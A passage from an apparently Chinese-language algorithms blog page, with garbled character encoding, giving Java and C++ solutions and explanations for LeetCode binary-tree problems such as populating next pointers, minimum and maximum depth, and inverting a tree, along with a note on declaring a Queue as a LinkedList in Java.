class="keyword">if</span>(node.left != <span class="literal">null</span>) queue.offer(node.left);</span><br><span class="line">                <span class="keyword">if</span>(node.right != <span class="literal">null</span>) queue.offer(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">            result.add(max);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="116-å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ"><a href="#116-å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ" class="headerlink" title="116.å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ"></a>116.å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ</h3><p>ç»™å®šä¸€ä¸ª å®Œç¾äºŒå‰æ ‘ ï¼Œå…¶æ‰€æœ‰å¶å­èŠ‚ç‚¹éƒ½åœ¨åŒä¸€å±‚ï¼Œæ¯ä¸ªçˆ¶èŠ‚ç‚¹éƒ½æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹ã€‚äºŒå‰æ ‘å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct Node &#123;</span><br><span class="line">  int val;</span><br><span class="line">  Node *left;</span><br><span class="line">  Node *right;</span><br><span class="line">  Node *next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œè®©è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ã€‚å¦‚æœæ‰¾ä¸åˆ°ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œåˆ™å°† next æŒ‡é’ˆè®¾ç½®ä¸º NULLã€‚</p><p>åˆå§‹çŠ¶æ€ä¸‹ï¼Œæ‰€æœ‰ next æŒ‡é’ˆéƒ½è¢«è®¾ç½®ä¸º NULLã€‚</p><p><img src="/2024/10/29/algorithm/binarytree/image-12.png"></p><p>æœ¬é¢˜ä¾ç„¶æ˜¯å±‚åºéå†ï¼Œåªä¸è¿‡åœ¨å•å±‚éå†çš„æ—¶å€™è®°å½•ä¸€ä¸‹æœ¬å±‚çš„å¤´éƒ¨èŠ‚ç‚¹ï¼Œç„¶ååœ¨éå†çš„æ—¶å€™è®©å‰ä¸€ä¸ªèŠ‚ç‚¹æŒ‡å‘æœ¬èŠ‚ç‚¹å°±å¯ä»¥äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Node <span class="title function_">connect</span><span class="params">(Node root)</span> &#123;</span><br><span class="line">        Queue&lt;Node&gt; tmpQueue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Node&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root != <span class="literal">null</span>) tmpQueue.add(root);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(tmpQueue.size() != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> tmpQueue.size();</span><br><span class="line">            <span class="type">Node</span> <span class="variable">cur</span> <span class="operator">=</span> tmpQueue.poll();</span><br><span class="line">            <span class="keyword">if</span>(cur.left != <span class="literal">null</span>) tmpQueue.add(cur.left);</span><br><span class="line">            <span class="keyword">if</span>(cur.right != <span class="literal">null</span>) tmpQueue.add(cur.right);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">1</span>; index &lt; size; index++)&#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">next</span> <span class="operator">=</span> tmpQueue.poll();</span><br><span class="line">                <span class="keyword">if</span>(next.left != <span class="literal">null</span>) tmpQueue.add(next.left);</span><br><span class="line">                <span class="keyword">if</span>(next.right != <span class="literal">null</span>) tmpQueue.add(next.right);</span><br><span class="line"></span><br><span class="line">                cur.next = next;</span><br><span class="line">                cur = next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="117-å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ-II"><a href="#117-å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ-II" class="headerlink" title="117. å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ II"></a>117. å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ II</h3><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼š</p><p>struct Node {<br>  int val;<br>  Node *left;<br>  Node *right;<br>  Node *next;<br>}<br>å¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œè®©è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ã€‚å¦‚æœæ‰¾ä¸åˆ°ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œåˆ™å°† next æŒ‡é’ˆè®¾ç½®ä¸º NULL ã€‚</p><p>åˆå§‹çŠ¶æ€ä¸‹ï¼Œæ‰€æœ‰ next æŒ‡é’ˆéƒ½è¢«è®¾ç½®ä¸º NULL ã€‚<br><img src="/2024/10/29/algorithm/binarytree/image-13.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Node <span class="title function_">connect</span><span class="params">(Node root)</span> &#123;</span><br><span class="line">        Queue&lt;Node&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root != <span class="literal">null</span>)&#123;</span><br><span class="line">            queue.add(root);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">nodePre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">                    nodePre = queue.poll(); <span class="comment">//å–å‡ºæœ¬å±‚å¤´ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">                    node = nodePre;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    node = queue.poll();</span><br><span class="line">                    nodePre.next = node; <span class="comment">// æœ¬å±‚å‰ä¸€ä¸ªèŠ‚ç‚¹ next æŒ‡å‘å½“å‰èŠ‚ç‚¹</span></span><br><span class="line">                    nodePre = nodePre.next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            nodePre.next = <span class="literal">null</span> ; <span class="comment">// æœ¬å±‚æœ€åä¸€ä¸ªnextæŒ‡å‘null</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="104-äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦"><a href="#104-äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦" class="headerlink" title="104.äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦"></a>104.äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦</h3><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œæ‰¾å‡ºå…¶æœ€å¤§æ·±åº¦ã€‚äºŒå‰æ ‘çš„ æœ€å¤§æ·±åº¦ æ˜¯æŒ‡ä»æ ¹èŠ‚ç‚¹åˆ°æœ€è¿œå¶å­èŠ‚ç‚¹çš„æœ€é•¿è·¯å¾„ä¸Šçš„èŠ‚ç‚¹æ•°ã€‚<br>è¯´æ˜: å¶å­èŠ‚ç‚¹æ˜¯æŒ‡æ²¡æœ‰å­èŠ‚ç‚¹çš„èŠ‚ç‚¹ã€‚</p><p>ä½¿ç”¨è¿­ä»£æ³•çš„è¯ï¼Œä½¿ç”¨å±‚åºéå†æ˜¯æœ€ä¸ºåˆé€‚çš„ï¼Œå› ä¸ºæœ€å¤§çš„æ·±åº¦å°±æ˜¯äºŒå‰æ ‘çš„å±‚æ•°ï¼Œå’Œå±‚åºéå†çš„æ–¹å¼æå…¶å»åˆã€‚<br>åœ¨äºŒå‰æ ‘ä¸­ï¼Œä¸€å±‚ä¸€å±‚çš„æ¥éå†äºŒå‰æ ‘ï¼Œè®°å½•ä¸€ä¸‹éå†çš„å±‚æ•°å°±æ˜¯äºŒå‰æ ‘çš„æ·±åº¦ï¼Œæ‰€ä»¥è¿™é“é¢˜çš„è¿­ä»£æ³•å°±æ˜¯ä¸€é“æ¨¡æ¿é¢˜ï¼Œå¯ä»¥ä½¿ç”¨äºŒå‰æ ‘å±‚åºéå†çš„æ¨¡æ¿æ¥è§£å†³çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        Queue&lt;TreeNode&gt; que = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        que.offer(root);</span><br><span class="line">        <span class="type">int</span> <span class="variable">depth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!que.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> que.size();</span><br><span class="line">            <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> que.poll();</span><br><span class="line">                <span class="keyword">if</span>(node.left != <span class="literal">null</span>) que.offer(node.left);</span><br><span class="line">                <span class="keyword">if</span>(node.right != <span class="literal">null</span>) que.offer(node.right);</span><br><span class="line">                len--;</span><br><span class="line">            &#125;</span><br><span class="line">            depth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="111-äºŒå‰æ ‘çš„æœ€å°æ·±åº¦"><a href="#111-äºŒå‰æ ‘çš„æœ€å°æ·±åº¦" class="headerlink" title="111.äºŒå‰æ ‘çš„æœ€å°æ·±åº¦"></a>111.äºŒå‰æ ‘çš„æœ€å°æ·±åº¦</h3><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œæ‰¾å‡ºå…¶æœ€å°æ·±åº¦ã€‚<br>æœ€å°æ·±åº¦æ˜¯ä»æ ¹èŠ‚ç‚¹åˆ°æœ€è¿‘å¶å­èŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„ä¸Šçš„èŠ‚ç‚¹æ•°é‡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="type">int</span> <span class="variable">depth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span>  <span class="operator">=</span> queue.size();</span><br><span class="line">            depth++;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)&#123;</span><br><span class="line">                cur = queue.poll();</span><br><span class="line">                <span class="keyword">if</span>(cur.left == <span class="literal">null</span> &amp;&amp; cur.right == <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> depth;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(cur.left != <span class="literal">null</span>) queue.offer(cur.left);</span><br><span class="line">                <span class="keyword">if</span>(cur.right != <span class="literal">null</span>) queue.offer(cur.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€’å½’æ³•</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftDepth</span> <span class="operator">=</span> minDepth(root.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightDepth</span> <span class="operator">=</span> minDepth(root.right);</span><br><span class="line">        <span class="comment">// åœ¨è®¡ç®—æœ€å°æ·±åº¦æ—¶ï¼Œå½“ä¸€ä¸ªå­æ ‘ä¸ºç©ºæ—¶ï¼Œå¿…é¡»æ²¿ç€å¦ä¸€ä¸ªéç©ºå­æ ‘å»å¯»æ‰¾å¶å­èŠ‚ç‚¹ï¼Œå› ä¸ºåªæœ‰åˆ°å¶å­èŠ‚ç‚¹çš„è·¯å¾„æ‰ç®—ä½œæ·±åº¦è·¯å¾„ã€‚</span></span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="literal">null</span>) <span class="keyword">return</span> rightDepth + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(root.right == <span class="literal">null</span>) <span class="keyword">return</span> leftDepth + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Math.min(leftDepth, rightDepth) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">depth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">minDepth</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        dep(root);</span><br><span class="line">        <span class="keyword">return</span> minDepth == Integer.MAX_VALUE ? <span class="number">0</span> : minDepth;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dep</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> ;</span><br><span class="line">        depth++;</span><br><span class="line">        dep(root.left);</span><br><span class="line">        dep(root.right);</span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>)</span><br><span class="line">            minDepth = Math.min(minDepth, depth);</span><br><span class="line">        depth--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;();</code> ç”¨ <code>Queue</code> æ¥å£°æ˜å˜é‡ï¼Œä½†ä½¿ç”¨ <code>LinkedList</code> æ¥å®ä¾‹åŒ–å®ƒã€‚è¿™ç§æ–¹å¼åœ¨ Java ä¸­æ˜¯å…è®¸çš„ï¼Œè€Œä¸”æœ‰å®ƒçš„è®¾è®¡æ„ä¹‰ã€‚</p><ol><li><p><strong>æ¥å£ä¸å®ç°åˆ†ç¦»</strong></p><ul><li><code>Queue</code> æ˜¯ Java ä¸­çš„ä¸€ä¸ªæ¥å£ï¼ˆinterfaceï¼‰ï¼Œå®ƒå®šä¹‰äº†é˜Ÿåˆ—ï¼ˆFIFOï¼Œå…ˆè¿›å…ˆå‡ºï¼‰çš„è¡Œä¸ºè§„èŒƒï¼Œæ¯”å¦‚ <code>offer</code>ã€<code>poll</code>ã€<code>peek</code> ç­‰æ–¹æ³•ã€‚</li><li><code>LinkedList</code> æ˜¯ä¸€ä¸ªå…·ä½“çš„ç±»ï¼Œå®ƒå®ç°äº† <code>Queue</code> æ¥å£ï¼Œæ‰€ä»¥ <code>LinkedList</code> å¯ä»¥è¢«ç”¨æ¥ä½œä¸º <code>Queue</code> çš„å®ç°ã€‚</li><li>ä½¿ç”¨æ¥å£æ¥å£°æ˜å˜é‡ï¼ˆå³ <code>Queue&lt;TreeNode&gt; queue</code>ï¼‰ï¼Œå¯ä»¥è®©ä»£ç æ›´åŠ çµæ´»ã€‚å¦‚æœä½ æƒ³è¦æ›´æ¢ä¸ºä¸åŒçš„é˜Ÿåˆ—å®ç°ï¼ˆä¾‹å¦‚ <code>PriorityQueue</code>ï¼‰ï¼Œå¯ä»¥ç›´æ¥æ›¿æ¢è€Œä¸æ”¹å˜å…¶ä»–ä»£ç ã€‚è¿™æ˜¯é¢å‘æ¥å£ç¼–ç¨‹çš„ä¸€ä¸ªåŸºæœ¬åŸåˆ™ã€‚</li></ul></li><li><p><strong>LinkedList ä½œä¸º Queue çš„å®ç°</strong></p><ul><li><code>LinkedList</code> æ˜¯ Java ä¸­ä¸€ä¸ªåŒå‘é“¾è¡¨çš„å®ç°ï¼ŒåŒæ—¶ä¹Ÿå®ç°äº†å¤šä¸ªæ¥å£ï¼ŒåŒ…æ‹¬ <code>Queue</code> å’Œ <code>Deque</code>ã€‚</li><li>åœ¨ <code>Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;();</code> ä¸­ï¼Œå£°æ˜çš„æ˜¯ <code>Queue</code> ç±»å‹ï¼Œä½†å®ƒçš„å®é™…è¿è¡Œæ—¶ç±»å‹æ˜¯ <code>LinkedList</code>ï¼Œå› æ­¤å¯ä»¥è°ƒç”¨ <code>Queue</code> æ¥å£ä¸­çš„æ–¹æ³•å¦‚ <code>offer</code> å’Œ <code>poll</code>ï¼Œå®ƒä»¬åœ¨ <code>LinkedList</code> ä¸­éƒ½æœ‰å…·ä½“çš„å®ç°ã€‚</li></ul></li><li><p><strong>ä¸ºä»€ä¹ˆè¿™æ ·åšï¼Ÿ</strong></p><ul><li>é€šè¿‡ <code>Queue</code> æ¥å£°æ˜å˜é‡ï¼Œä½¿å¾—ä»£ç çš„ä¾èµ–æ€§é™ä½ã€‚æ¢å¥è¯è¯´ï¼Œä»£ç åªä¾èµ–äº <code>Queue</code> çš„è¡Œä¸ºï¼ˆæ–¹æ³•ï¼‰ï¼Œè€Œä¸å…³å¿ƒå®ƒçš„å…·ä½“å®ç°ã€‚</li><li>è¿™ç§æ–¹å¼ä¸ä»…æé«˜äº†ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ï¼Œä¹Ÿä½¿å¾—åœ¨éœ€è¦æ—¶æ›´å®¹æ˜“æ›¿æ¢åº•å±‚çš„å®ç°ç±»ã€‚</li></ul></li></ol><p>ä»£ç ç¤ºä¾‹<br>å¦‚æœä»¥åæƒ³æ›¿æ¢å®ç°ï¼Œåªéœ€æ›´æ”¹å®ä¾‹åŒ–éƒ¨åˆ†å³å¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(); <span class="comment">// å‡è®¾éœ€è¦ä¼˜å…ˆé˜Ÿåˆ—</span></span><br></pre></td></tr></table></figure><h2 id="226-ç¿»è½¬äºŒå‰æ ‘"><a href="#226-ç¿»è½¬äºŒå‰æ ‘" class="headerlink" title="226.ç¿»è½¬äºŒå‰æ ‘"></a>226.ç¿»è½¬äºŒå‰æ ‘</h2><p>ç¿»è½¬ä¸€æ£µäºŒå‰æ ‘ã€‚<br><img src="/2024/10/29/algorithm/binarytree/image-14.png" alt="è¾“å…¥"><br><img src="/2024/10/29/algorithm/binarytree/image-15.png" alt="è¾“å‡º"><br><a href="https://www.programmercarl.com/0226.%E7%BF%BB%E8%BD%AC%E4%BA%8C%E5%8F%89%E6%A0%91.html#%E6%80%9D%E8%B7%AF">https://www.programmercarl.com/0226.%E7%BF%BB%E8%BD%AC%E4%BA%8C%E5%8F%89%E6%A0%91.html#%E6%80%9D%E8%B7%AF</a></p><p>é€’å½’çš„ä¸­åºéå†æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºä½¿ç”¨é€’å½’çš„ä¸­åºéå†ï¼ŒæŸäº›èŠ‚ç‚¹çš„å·¦å³å­©å­ä¼šç¿»è½¬ä¸¤æ¬¡ã€‚<br>å¦‚æœéè¦ä½¿ç”¨é€’å½’ä¸­åºçš„æ–¹å¼å†™ï¼Œä¹Ÿå¯ä»¥ï¼Œå¦‚ä¸‹ä»£ç å°±å¯ä»¥é¿å…èŠ‚ç‚¹å·¦å³å­©å­ç¿»è½¬ä¸¤æ¬¡çš„æƒ…å†µï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">invertTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> root;</span><br><span class="line">        <span class="built_in">invertTree</span>(root-&gt;left);         <span class="comment">// å·¦</span></span><br><span class="line">        <span class="built_in">swap</span>(root-&gt;left, root-&gt;right);  <span class="comment">// ä¸­</span></span><br><span class="line">        <span class="built_in">invertTree</span>(root-&gt;left);         <span class="comment">// æ³¨æ„ è¿™é‡Œä¾ç„¶è¦éå†å·¦å­©å­ï¼Œå› ä¸ºä¸­é—´èŠ‚ç‚¹å·²ç»ç¿»è½¬äº†</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä»£ç è™½ç„¶å¯ä»¥ï¼Œä½†è¿™æ¯•ç«Ÿä¸æ˜¯çœŸæ­£çš„é€’å½’ä¸­åºéå†äº†ã€‚ä½†ä½¿ç”¨è¿­ä»£æ–¹å¼ç»Ÿä¸€å†™æ³•çš„ä¸­åºæ˜¯å¯ä»¥çš„ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">invertTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) st.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            TreeNode* node = st.<span class="built_in">top</span>();</span><br><span class="line">            <span class="keyword">if</span> (node != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) st.<span class="built_in">push</span>(node-&gt;right);  <span class="comment">// å³</span></span><br><span class="line">                st.<span class="built_in">push</span>(node);                          <span class="comment">// ä¸­</span></span><br><span class="line">                st.<span class="built_in">push</span>(<span class="literal">NULL</span>);</span><br><span class="line">                <span 